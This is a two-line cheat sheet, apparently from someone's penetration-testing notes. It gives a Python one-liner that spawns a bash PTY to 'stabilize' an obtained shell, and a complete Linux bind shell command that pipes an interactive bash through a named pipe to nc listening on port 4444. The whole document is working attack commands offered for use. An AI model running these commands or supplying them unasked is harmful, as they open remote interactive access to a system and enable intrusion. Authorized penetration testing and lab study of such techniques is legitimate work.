Poor mans Stabilize
python3 -c 'import pty;pty.spawn("/bin/bash")'


bind shell linux:
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l $IP 4444 > /tmp/f`